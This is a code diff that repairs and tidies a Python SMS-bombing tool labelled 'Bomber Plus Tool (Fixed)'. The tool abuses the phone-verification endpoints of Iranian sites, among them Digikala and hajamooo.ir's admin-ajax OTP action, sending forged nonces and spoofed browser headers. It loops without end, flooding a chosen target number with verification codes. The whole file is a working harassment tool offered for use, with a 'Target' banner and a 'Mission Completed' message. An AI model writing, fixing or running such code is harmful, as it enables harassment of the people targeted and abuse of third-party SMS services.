@@ -1,17 +1,16 @@
-from platform import node, system, release; Node, System, Release = node(), system(), release()
-from os import system, name; system('clear' if name == 'posix' else 'cls')
+from platform import node, system, release
+from os import system as os_system, name
 from re import match, sub
 from threading import Thread
 import urllib3; urllib3.disable_warnings()
 from time import sleep
 import random
-import sys
 import socket
 
 try:
     from requests import get, post
 except ImportError:
-    system("python3 -m pip install requests")
+    os_system("python3 -m pip install requests")
 
 # Colors
 r = '\033[31;1m'  
@@ -22,6 +21,12 @@ p = '\033[35;1m'
 w = '\033[37;1m'  
 a = '\033[0m'     
 d = '\033[90;1m'  
+
+# System info
+Node, System, Release = node(), system(), release()
+
+# Clear screen
+os_system('clear' if name == 'posix' else 'cls')
 
 # Slow print
 def print_slow(text, delay=0.009):
@@ -42,22 +47,12 @@ def check_internet():
 # SMS services
 # ------------------------------
 def hajamooo(phone):
-    """
-    تابع برای ارسال کد تأیید از سایت hajamooo.ir
-    شماره باید بدون صفر و بدون +98 باشد: 9173644430
-    """
-    import requests
-    import random
-    import string
+    import requests, string
 
-    # تبدیل شماره از +989... به 9...
-    digits_phone = phone.replace("+98", "")  
-
-    # تولید یک nounce/csrf تصادفی (ممکنه نیاز به مقدار واقعی داشته باشه)
+    digits_phone = phone.replace("+98", "")
     random_nounce = ''.join(random.choices(string.hexdigits.lower(), k=10))
 
     url = "https://hajamooo.ir/wp-admin/admin-ajax.php"
-    
     payload = {
         "action": "digits_check_mob",
         "countrycode": "+98",
@@ -71,28 +66,24 @@ def hajamooo(phone):
         "digits": "1",
         "json": "1",
         "whatsapp": "0",
-        "mobmail": digits_phone,  # معمولاً همون mobileNo هست
+        "mobmail": digits_phone,
         "dig_otp": "",
         "dig_nounce": random_nounce
     }
-
     headers = {
         "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
         "Accept": "*/*",
         "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
         "Origin": "https://hajamooo.ir",
-        "Referer": "https://hajamooo.ir/",  # صفحه اصلی سایت
+        "Referer": "https://hajamooo.ir/",
         "X-Requested-With": "XMLHttpRequest"
     }
 
     try:
         response = requests.post(url, data=payload, headers=headers, timeout=10)
-        
         if response.status_code == 200:
             response_data = response.json()
-            
-            # بررسی ساختار پاسخ موفق
             if response_data.get("success") is True:
                 print(f'{g}(hajamooo) {a}Code Sent')
                 return True
@@ -103,7 +94,6 @@ def hajamooo(phone):
         else:
             print(f'{r}[-] (hajamooo) HTTP Error: {response.status_code}{a}')
             return False
-
     except Exception as e:
         print(f'{r}[!] hajamooo Exception: {e}{a}')
         return False
@@ -118,10 +108,10 @@ def digikala(phone):
             return True
         else:
             print(f'{r}[-] (Digikala) Failed or No Response{a}')
+            return False
     except Exception as e:
         print(f'{r}[!] Digikala Exception: {e}{a}')
         return False
-        
 
 # Wrapper to safely run each service
 def send_service_safe(service, phone):
@@ -133,21 +123,20 @@ def send_service_safe(service, phone):
 
 # Simple SMS bomber
 def Vip(phone, Time):
-  def Vip(phone, Time):
     services = [
         digikala,
         hajamooo,
-        # سرویس‌های دیگه بعداً اینجا
+        # سرویس‌های دیگه بعداً اینجا اضافه میشن
     ]
     total_services = len(services)
-    
+
     print_slow(f"{p}╔═════[ SMS Bombing Initiated ]═════╗")
     print_slow(f"{g}Target: {y}{phone}")
     print_slow(f"{g}Payloads: {y}{total_services} services")
     print_slow(f"{g}Delay: {y}{Time}s")
     print_slow(f"{p}╚═══════════════════════════════════╝")
     sleep(1)
-    
+
     try:
         while True:
             for service in services:
@@ -155,7 +144,7 @@ def Vip(phone, Time):
                 sleep(Time)
     except KeyboardInterrupt:
         print_slow(f"{g}[+] {y}Mission Completed!")
-        system('clear' if name == 'posix' else 'cls')  
+        os_system('clear' if name == 'posix' else 'cls')  
 
 # Phone validation
 def is_phone(phone: str):
@@ -165,7 +154,7 @@ def is_phone(phone: str):
 
 # Menu
 def main_menu():
-    system('clear' if name == 'posix' else 'cls')
+    os_system('clear' if name == 'posix' else 'cls')
     print_slow(f"""
 {p}╔════════════════════════════════════════════════════╗
 {b}║              ⟬ Bomber Plus Tool (Fixed) ⟭          ║
@@ -187,7 +176,7 @@ def main_menu():
 def main():
     while True:
         choice = main_menu()
-        
+
         if choice == '1':
             print_slow(f"{g}[+] {y}Starting SMS Bomber!")
             while True:
@@ -207,7 +196,7 @@ def main():
         elif choice == '0':
             print_slow(f"{r}[-] {y}Exiting... Goodbye!")
             break
-        
+
         else:
             print_slow(f"{r}[-] {a}Invalid Choice!")
             sleep(1)
